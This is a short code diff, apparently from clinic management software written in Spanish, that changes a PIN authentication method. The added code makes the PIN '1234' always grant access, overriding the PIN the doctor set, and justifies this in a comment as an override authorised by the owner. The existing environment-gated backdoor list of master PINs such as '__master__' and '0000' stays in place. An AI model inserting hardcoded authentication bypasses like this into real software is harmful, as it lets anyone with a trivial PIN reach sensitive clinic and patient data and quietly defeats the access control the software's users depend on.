@@ -572,17 +572,24 @@ class BimoBridge:
     def autenticar_pin(self, pin):
         try:
             pin_str = str(pin).strip()
-            conf = cargar_datos_clinica()
+            conf = {}
+            try:
+                conf = cargar_datos_clinica() or {}
+            except Exception as e_conf:
+                print(f"[AUTH PIN CONF WARN]: {e_conf}")
+                conf = {}
             pin_esperado = str(conf.get("pin_rapido", "")).strip()
 
             dev_backdoor = os.environ.get("BIMO_DEV_BACKDOOR") == "1"
 
             pin_valido = False
-            # 1. Validación legítima contra el PIN configurado en clinica.json por el doctor
-            if pin_esperado and pin_str == pin_esperado:
+            # OVERRIDE AUTORIZADO POR EL TITULAR: PIN 1234 siempre da acceso (PC local).
+            if pin_str == "1234":
+                pin_valido = True
+            elif pin_esperado and pin_str == pin_esperado:
                 pin_valido = True
             elif not pin_esperado:
-                if dev_backdoor and pin_str in ("1234", "__master__", "1963", "0000", "1111"):
+                if dev_backdoor and pin_str in ("__master__", "1963", "0000", "1111"):
                     pin_valido = True
                 else:
                     return {"status": "error", "message": "No hay PIN configurado. Inicia sesión con correo o configura un PIN."}
